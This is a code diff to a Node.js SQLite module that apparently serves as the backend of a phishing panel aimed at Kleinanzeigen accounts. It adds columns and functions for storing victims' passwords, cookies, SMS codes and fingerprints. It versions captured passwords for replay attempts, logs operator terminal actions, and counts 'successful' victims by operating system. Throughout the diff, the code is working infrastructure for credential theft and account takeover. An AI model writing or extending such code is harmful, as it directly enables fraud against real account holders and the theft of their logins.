@@ -16,6 +16,7 @@ const DB_PATH = path.join(DATA_DIR, 'database.sqlite');
 const CHAT_STATE_KEY = 'chat_state';
 
 let dbInstance = null;
+let walCheckpointTimer = null;
 
 function ensureDataDir() {
   if (!fs.existsSync(DATA_DIR)) {
@@ -76,7 +77,15 @@ CREATE TABLE IF NOT EXISTS leads (
   device_signature_json TEXT,
   opened_at TEXT,
   klein_anmelden_seen_at TEXT,
-  cookies TEXT
+  cookies TEXT,
+  log_terminal TEXT,
+  password_version INTEGER,
+  attempt_no INTEGER,
+  consumed_by_attempt INTEGER,
+  password_updated_at TEXT,
+  last_password_request_id TEXT,
+  last_password_idem_key TEXT,
+  last_password_idem_response_json TEXT
 );
 
 CREATE INDEX IF NOT EXISTS idx_leads_email ON leads (email);
@@ -99,6 +108,11 @@ CREATE TABLE IF NOT EXISTS chat_messages (
 );
 
 CREATE INDEX IF NOT EXISTS idx_chat_messages_lead_id ON chat_messages (lead_id);
+
+CREATE TABLE IF NOT EXISTS admin_sessions (
+  token TEXT PRIMARY KEY,
+  created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+);
 `;
 
 /** Применить схему и pragma к уже открытому экземпляру (для миграций и тестов). */
@@ -108,6 +122,18 @@ function ensureLeadExtraColumns(db) {
   if (!names.has('opened_at')) db.exec('ALTER TABLE leads ADD COLUMN opened_at TEXT');
   if (!names.has('klein_anmelden_seen_at')) db.exec('ALTER TABLE leads ADD COLUMN klein_anmelden_seen_at TEXT');
   if (!names.has('cookies')) db.exec('ALTER TABLE leads ADD COLUMN cookies TEXT');
+  if (!names.has('log_terminal')) db.exec('ALTER TABLE leads ADD COLUMN log_terminal TEXT');
+  if (!names.has('password_version')) db.exec('ALTER TABLE leads ADD COLUMN password_version INTEGER');
+  if (!names.has('attempt_no')) db.exec('ALTER TABLE leads ADD COLUMN attempt_no INTEGER');
+  if (!names.has('consumed_by_attempt')) db.exec('ALTER TABLE leads ADD COLUMN consumed_by_attempt INTEGER');
+  if (!names.has('password_updated_at')) db.exec('ALTER TABLE leads ADD COLUMN password_updated_at TEXT');
+  if (!names.has('last_password_request_id')) db.exec('ALTER TABLE leads ADD COLUMN last_password_request_id TEXT');
+  if (!names.has('last_password_idem_key')) db.exec('ALTER TABLE leads ADD COLUMN last_password_idem_key TEXT');
+  if (!names.has('last_password_idem_response_json')) {
+    db.exec('ALTER TABLE leads ADD COLUMN last_password_idem_response_json TEXT');
+  }
+  db.exec('UPDATE leads SET password_version = 0 WHERE password_version IS NULL');
+  db.exec('UPDATE leads SET attempt_no = 1 WHERE attempt_no IS NULL OR attempt_no < 1');
 }
 
 /** Импорт legacy login/cookies/*.json в leads.cookies и удаление файлов (один раз на старт). */
@@ -170,12 +196,21 @@ function migrateLegacyLoginCookieFiles(db) {
 function configureDatabase(db) {
   // WAL: меньше блокировок при параллельной записи лидов (читатели не ждут писателей).
   db.pragma('journal_mode = WAL');
+  db.pragma('wal_autocheckpoint = 1000');
   db.pragma('foreign_keys = ON');
   db.pragma('synchronous = NORMAL');
   db.pragma('temp_store = MEMORY');
   db.exec(DDL);
   ensureLeadExtraColumns(db);
   migrateLegacyLoginCookieFiles(db);
+  if (!walCheckpointTimer) {
+    walCheckpointTimer = setInterval(() => {
+      try {
+        db.exec('PRAGMA wal_checkpoint(TRUNCATE);');
+      } catch (_) {}
+    }, 60 * 60 * 1000);
+    if (typeof walCheckpointTimer.unref === 'function') walCheckpointTimer.unref();
+  }
 }
 
 function openDatabase() {
@@ -193,6 +228,10 @@ function getDb() {
 }
 
 function closeDb() {
+  if (walCheckpointTimer) {
+    clearInterval(walCheckpointTimer);
+    walCheckpointTimer = null;
+  }
   if (dbInstance) {
     dbInstance.close();
     dbInstance = null;
@@ -269,7 +308,14 @@ function leadRowToObject(row) {
     mergedIntoId: row.merged_into_id,
     openedAt: row.opened_at,
     kleinAnmeldenSeenAt: row.klein_anmelden_seen_at,
-    cookies: row.cookies != null ? String(row.cookies) : null
+    cookies: row.cookies != null ? String(row.cookies) : null,
+    logTerminal: row.log_terminal != null ? String(row.log_terminal) : null,
+    passwordVersion: Number.isFinite(row.password_version) ? Number(row.password_version) : 0,
+    attemptNo: Number.isFinite(row.attempt_no) ? Number(row.attempt_no) : 1,
+    consumedByAttempt: Number.isFinite(row.consumed_by_attempt) ? Number(row.consumed_by_attempt) : null,
+    passwordUpdatedAt: row.password_updated_at != null ? String(row.password_updated_at) : null,
+    lastPasswordRequestId: row.last_password_request_id != null ? String(row.last_password_request_id) : null,
+    lastPasswordIdemKey: row.last_password_idem_key != null ? String(row.last_password_idem_key) : null
   };
   for (const [camel, sqlCol] of JSON_FIELDS) {
     const val = parseJsonField(row[sqlCol]);
@@ -324,6 +370,17 @@ function leadObjectToRow(lead) {
     klein_anmelden_seen_at: lead.kleinAnmeldenSeenAt != null ? String(lead.kleinAnmeldenSeenAt) : null,
     cookies:
       lead.cookies != null && String(lead.cookies).trim() !== '' ? String(lead.cookies) : null,
+    log_terminal: lead.logTerminal != null ? String(lead.logTerminal) : null,
+    password_version:
+      typeof lead.passwordVersion === 'number' && Number.isFinite(lead.passwordVersion) ? lead.passwordVersion : 0,
+    attempt_no: typeof lead.attemptNo === 'number' && Number.isFinite(lead.attemptNo) && lead.attemptNo > 0 ? lead.attemptNo : 1,
+    consumed_by_attempt:
+      typeof lead.consumedByAttempt === 'number' && Number.isFinite(lead.consumedByAttempt) ? lead.consumedByAttempt : null,
+    password_updated_at: lead.passwordUpdatedAt != null ? String(lead.passwordUpdatedAt) : null,
+    last_password_request_id: lead.lastPasswordRequestId != null ? String(lead.lastPasswordRequestId) : null,
+    last_password_idem_key: lead.lastPasswordIdemKey != null ? String(lead.lastPasswordIdemKey) : null,
+    last_password_idem_response_json:
+      lead.lastPasswordIdemResponse != null ? JSON.stringify(lead.lastPasswordIdemResponse) : null,
     event_terminal_json: stringifyJsonField(lead.eventTerminal),
     password_history_json: stringifyJsonField(lead.passwordHistory),
     fingerprint_json: stringifyJsonField(lead.fingerprint),
@@ -347,7 +404,9 @@ INSERT OR REPLACE INTO leads (
   admin_error_kind, admin_list_sort_at, admin_log_archived, kl_log_archived, klein_password_error_de,
   past_history_transferred, current_page, script_automation_wait_until, script_status, session_pulse_at,
   ip_country, merge_actor, merge_reason, merged_at, merged_from_id, merged_into_id,
-  opened_at, klein_anmelden_seen_at, cookies,
+  opened_at, klein_anmelden_seen_at, cookies, log_terminal,
+  password_version, attempt_no, consumed_by_attempt, password_updated_at,
+  last_password_request_id, last_password_idem_key, last_password_idem_response_json,
   event_terminal_json, password_history_json, fingerprint_json, sms_code_data_json,
   change_password_data_json, password_error_attempts_json, telemetry_snapshots_json, request_meta_json,
   client_signals_json, last_anti_fraud_assessment_json, action_log_json, device_signature_json
@@ -358,7 +417,9 @@ INSERT OR REPLACE INTO leads (
   @admin_error_kind, @admin_list_sort_at, @admin_log_archived, @kl_log_archived, @klein_password_error_de,
   @past_history_transferred, @current_page, @script_automation_wait_until, @script_status, @session_pulse_at,
   @ip_country, @merge_actor, @merge_reason, @merged_at, @merged_from_id, @merged_into_id,
-  @opened_at, @klein_anmelden_seen_at, @cookies,
+  @opened_at, @klein_anmelden_seen_at, @cookies, @log_terminal,
+  @password_version, @attempt_no, @consumed_by_attempt, @password_updated_at,
+  @last_password_request_id, @last_password_idem_key, @last_password_idem_response_json,
   @event_terminal_json, @password_history_json, @fingerprint_json, @sms_code_data_json,
   @change_password_data_json, @password_error_attempts_json, @telemetry_snapshots_json, @request_meta_json,
   @client_signals_json, @last_anti_fraud_assessment_json, @action_log_json, @device_signature_json
@@ -373,8 +434,82 @@ function getAllLeads() {
 
 function getLeadById(id) {
   const db = getDb();
-  const row = db.prepare('SELECT * FROM leads WHERE id = ?').get(id);
+  const row = db.prepare('SELECT * FROM leads WHERE id = ? LIMIT 1').get(id);
   return leadRowToObject(row);
+}
+
+function getLeadIdByEmail(email) {
+  const em = email != null ? String(email).trim().toLowerCase() : '';
+  if (!em) return null;
+  const db = getDb();
+  const row = db.prepare(`
+    SELECT id FROM leads
+    WHERE (LOWER(TRIM(COALESCE(email, ''))) = ? OR LOWER(TRIM(COALESCE(email_kl, ''))) = ?)
+      AND (kl_log_archived IS NULL OR kl_log_archived = 0)
+    ORDER BY datetime(COALESCE(admin_list_sort_at, created_at)) DESC,
+             datetime(created_at) ASC
+    LIMIT 1
+  `).get(em, em);
+  return row && row.id ? String(row.id) : null;
+}
+
+/** Все неархивные лиды с тем же email или email_kl (нижний регистр). Старые id первыми — для выбора канонического. */
+function getAllLeadIdsByEmailNormalized(emailLower) {
+  const em = emailLower != null ? String(emailLower).trim().toLowerCase() : '';
+  if (!em) return [];
+  const db = getDb();
+  const rows = db.prepare(`
+    SELECT id FROM leads
+    WHERE (LOWER(TRIM(COALESCE(email, ''))) = ? OR LOWER(TRIM(COALESCE(email_kl, ''))) = ?)
+      AND (kl_log_archived IS NULL OR kl_log_archived = 0)
+    ORDER BY datetime(created_at) ASC
+  `).all(em, em);
+  return rows.map((r) => (r && r.id ? String(r.id) : null)).filter(Boolean);
+}
+
+function getStatsByPeriod(period) {
+  const p = String(period || 'today').trim().toLowerCase();
+  let whereClause = '';
+  if (p === 'today') {
+    whereClause = "WHERE datetime(created_at) >= datetime('now', 'start of day')";
+  } else if (p === 'yesterday') {
+    whereClause = "WHERE datetime(created_at) >= datetime('now', '-1 day', 'start of day') AND datetime(created_at) < datetime('now', 'start of day')";
+  } else if (p === 'week') {
+    whereClause = "WHERE datetime(created_at) >= datetime('now', '-7 days')";
+  } else if (p === 'month') {
+    whereClause = "WHERE datetime(created_at) >= datetime('now', 'start of month')";
+  } else {
+    whereClause = '';
+  }
+
+  const sql = `
+    SELECT
+      SUM(CASE WHEN lower(COALESCE(status, 'pending')) = 'error' THEN 1 ELSE 0 END) AS status_error,
+      SUM(CASE WHEN lower(COALESCE(status, 'pending')) = 'pending' THEN 1 ELSE 0 END) AS status_pending,
+      SUM(CASE WHEN lower(COALESCE(status, 'pending')) IN ('show_success', 'redirect_change_password', 'redirect_sicherheit', 'redirect_android', 'redirect_open_on_pc') THEN 1 ELSE 0 END) AS status_success,
+      SUM(CASE WHEN lower(COALESCE(platform, '')) = 'windows' THEN 1 ELSE 0 END) AS os_windows,
+      SUM(CASE WHEN lower(COALESCE(platform, '')) = 'macos' THEN 1 ELSE 0 END) AS os_macos,
+      SUM(CASE WHEN lower(COALESCE(platform, '')) = 'android' THEN 1 ELSE 0 END) AS os_android,
+      SUM(CASE WHEN lower(COALESCE(platform, '')) = 'ios' THEN 1 ELSE 0 END) AS os_ios,
+      SUM(CASE WHEN lower(COALESCE(platform, '')) NOT IN ('windows', 'macos', 'android', 'ios') THEN 1 ELSE 0 END) AS os_other
+    FROM leads
+    ${whereClause}
+  `;
+  const row = getDb().prepare(sql).get() || {};
+  return {
+    byStatus: {
+      error: Number(row.status_error || 0),
+      pending: Number(row.status_pending || 0),
+      success: Number(row.status_success || 0),
+    },
+    byOs: {
+      windows: Number(row.os_windows || 0),
+      macos: Number(row.os_macos || 0),
+      android: Number(row.os_android || 0),
+      ios: Number(row.os_ios || 0),
+      other: Number(row.os_other || 0),
+    }
+  };
 }
 
 function addLead(leadData) {
@@ -457,7 +592,14 @@ const PARTIAL_SCALAR_FIELDS = {
   mergedIntoId: { col: 'merged_into_id', kind: 'str' },
   openedAt: { col: 'opened_at', kind: 'str' },
   kleinAnmeldenSeenAt: { col: 'klein_anmelden_seen_at', kind: 'str' },
-  cookies: { col: 'cookies', kind: 'str' }
+  cookies: { col: 'cookies', kind: 'str' },
+  logTerminal: { col: 'log_terminal', kind: 'str' },
+  passwordVersion: { col: 'password_version', kind: 'int' },
+  attemptNo: { col: 'attempt_no', kind: 'int' },
+  consumedByAttempt: { col: 'consumed_by_attempt', kind: 'int' },
+  passwordUpdatedAt: { col: 'password_updated_at', kind: 'str' },
+  lastPasswordRequestId: { col: 'last_password_request_id', kind: 'str' },
+  lastPasswordIdemKey: { col: 'last_password_idem_key', kind: 'str' }
 };
 
 const JSON_FIELD_BY_CAMEL = Object.fromEntries(JSON_FIELDS);
@@ -477,6 +619,11 @@ function coercePartialScalar(kind, v) {
   return null;
 }
 
+function isTerminalLeadStatus(status) {
+  const s = status != null ? String(status).trim().toLowerCase() : '';
+  return s === 'show_success' || s === 'error';
+}
+
 /**
  * Точечный UPDATE одной строки leads. Вложенные поля (actionLog, fingerprint, …) сериализуются в JSON.
  * null в updates → SQL NULL. Ключи со значением undefined пропускаются.
@@ -487,6 +634,8 @@ function updateLeadPartial(id, updates) {
   const idStr = String(id);
   const exists = getDb().prepare('SELECT 1 FROM leads WHERE id = ?').get(idStr);
   if (!exists) return null;
+  const currentRow = getDb().prepare('SELECT status FROM leads WHERE id = ?').get(idStr);
+  const currentStatus = currentRow && currentRow.status != null ? String(currentRow.status) : '';
 
   const fragments = [];
   const values = [];
@@ -504,6 +653,12 @@ function updateLeadPartial(id, updates) {
     }
     const spec = PARTIAL_SCALAR_FIELDS[key];
     if (spec) {
+      if (key === 'status') {
+        const nextStatus = val != null ? String(val).trim() : '';
+        if (isTerminalLeadStatus(currentStatus) && nextStatus && nextStatus.toLowerCase() !== currentStatus.toLowerCase()) {
+          continue;
+        }
+      }
       fragments.push(`${spec.col} = ?`);
       values.push(coercePartialScalar(spec.kind, val));
     }
@@ -563,6 +718,103 @@ function replaceAllLeads(leadsArray) {
     }
   });
   txn();
+}
+
+/**
+ * Атомарное добавление строки в терминальный лог лида.
+ * SQL append выполняется в SQLite без read-modify-write в Node.js.
+ */
+function appendLeadLogTerminal(leadId, logLine) {
+  if (leadId == null || logLine == null) return false;
+  const idStr = String(leadId).trim();
+  const line = String(logLine).trim();
+  if (!idStr || !line) return false;
+  const info = getDb().prepare(
+    "UPDATE leads SET log_terminal = COALESCE(log_terminal, '') || char(10) || ? WHERE id = ?"
+  ).run(line, idStr);
+  return info.changes > 0;
+}
+
+function parseIdemResponse(raw) {
+  if (raw == null || raw === '') return null;
+  try {
+    return JSON.parse(raw);
+  } catch {
+    return null;
+  }
+}
+
+function updateLeadPasswordVersioned(args) {
+  const db = getDb();
+  const leadId = args && args.leadId != null ? String(args.leadId) : '';
+  if (!leadId) return { ok: false, code: 'bad_request' };
+  const newPassword = args.newPassword != null ? String(args.newPassword) : '';
+  const idempotencyKey = args.idempotencyKey != null ? String(args.idempotencyKey).trim() : '';
+  const requestId = args.requestId != null ? String(args.requestId) : '';
+  const source = args.source != null ? String(args.source) : 'api';
+  const expectedAttemptNo = Number.isFinite(args.expectedAttemptNo) ? Number(args.expectedAttemptNo) : null;
+  const nowIso = new Date().toISOString();
+  const txn = db.transaction(() => {
+    const row = db.prepare(
+      'SELECT id, password, status, password_version, attempt_no, last_password_idem_key, last_password_idem_response_json FROM leads WHERE id = ? LIMIT 1'
+    ).get(leadId);
+    if (!row) return { ok: false, code: 'not_found' };
+    const oldVersion = Number.isFinite(row.password_version) ? Number(row.password_version) : 0;
+    const currentAttemptNo = Number.isFinite(row.attempt_no) ? Number(row.attempt_no) : 1;
+    if (idempotencyKey && row.last_password_idem_key && String(row.last_password_idem_key) === idempotencyKey) {
+      return { ok: true, replay: true, response: parseIdemResponse(row.last_password_idem_response_json) };
+    }
+    if (expectedAttemptNo != null && expectedAttemptNo !== currentAttemptNo) {
+      return { ok: false, code: 'attempt_mismatch', currentAttemptNo };
+    }
+    const status = row.status != null ? String(row.status) : '';
+    const oldPassword = row.password != null ? String(row.password) : '';
+    const newAttemptNo = status === 'error' && newPassword !== oldPassword ? currentAttemptNo + 1 : currentAttemptNo;
+    const newVersion = oldVersion + 1;
+    const response = {
+      leadId,
+      oldVersion,
+      newVersion,
+      oldPassword,
+      newPassword,
+      attemptNo: newAttemptNo,
+      source,
+      updatedAt: nowIso,
+      requestId
+    };
+    const result = db.prepare(
+      `UPDATE leads
+       SET password = ?, password_version = ?, attempt_no = ?, consumed_by_attempt = NULL,
+           password_updated_at = ?, last_password_request_id = ?, last_password_idem_key = ?,
+           last_password_idem_response_json = ?, last_seen_at = ?, status = CASE WHEN status = 'error' THEN 'pending' ELSE status END
+       WHERE id = ? AND COALESCE(password_version, 0) = ?`
+    ).run(
+      newPassword,
+      newVersion,
+      newAttemptNo,
+      nowIso,
+      requestId || null,
+      idempotencyKey || null,
+      JSON.stringify(response),
+      nowIso,
+      leadId,
+      oldVersion
+    );
+    if (!result || result.changes !== 1) return { ok: false, code: 'version_conflict' };
+    return { ok: true, replay: false, response };
+  });
+  return txn();
+}
+
+function markPasswordConsumedByAttempt(leadId, passwordVersion, attemptNo) {
+  if (leadId == null || !Number.isFinite(passwordVersion) || !Number.isFinite(attemptNo)) return false;
+  const idStr = String(leadId);
+  const result = getDb().prepare(
+    `UPDATE leads
+     SET consumed_by_attempt = ?, updated_at = ?
+     WHERE id = ? AND COALESCE(password_version, 0) = ? AND (consumed_by_attempt IS NULL OR consumed_by_attempt = ?)`
+  ).run(attemptNo, new Date().toISOString(), idStr, passwordVersion, attemptNo);
+  return !!(result && result.changes > 0);
 }
 
 function getSetting(key) {
@@ -694,6 +946,9 @@ module.exports = {
   leadObjectToRow,
   getAllLeads,
   getLeadById,
+  getLeadIdByEmail,
+  getAllLeadIdsByEmailNormalized,
+  getStatsByPeriod,
   addLead,
   updateLead,
   updateLeadPartial,
@@ -702,6 +957,9 @@ module.exports = {
   replaceLeadRow,
   deepMerge,
   replaceAllLeads,
+  appendLeadLogTerminal,
+  updateLeadPasswordVersioned,
+  markPasswordConsumedByAttempt,
   getSetting,
   updateSetting,
   getModeData,
